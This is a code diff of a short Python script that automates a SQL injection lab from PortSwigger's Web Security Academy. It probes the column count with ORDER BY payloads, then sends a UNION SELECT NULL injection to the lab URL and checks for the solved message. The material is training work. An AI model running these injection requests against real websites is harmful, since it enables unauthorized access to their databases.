@@ -1,11 +1,11 @@
+#created to be used with Portswigger WebSec Academy
+#replace url with lab url similar to one seen below
 import requests
-
 url = 'https://ac101f911ebb51778049188000010041.web-security-academy.net/filter?category=Accessories'
 
 sqli_row = ["'+ORDER+BY+",
             "'+UNION+SELECT+"]
 used_attack_r = []
-null_x = 0
 nulls = ""
 
 session = requests.Session()
@@ -24,14 +24,12 @@ if r.status_code == 200:
         if r.status_code == 500:
             print("Valid number of rows is:",x-1)
             print(used_attack_r[x-2])
-            null_x = x-1
+            for x in range(x-1):
+                nulls += "NULL,"
             break
-for x in range(null_x):
-    nulls += "NULL,"
+
 nulls = nulls[:len(nulls)-1]
-print(nulls)
 final_attack = url[:url.rfind("=")+1]+sqli_row[1]+nulls+"--" 
-print(final_attack)
 r = session.get(url=final_attack)
 if "Congratulations, you solved the lab!" in r.text:
     print("lab passed")
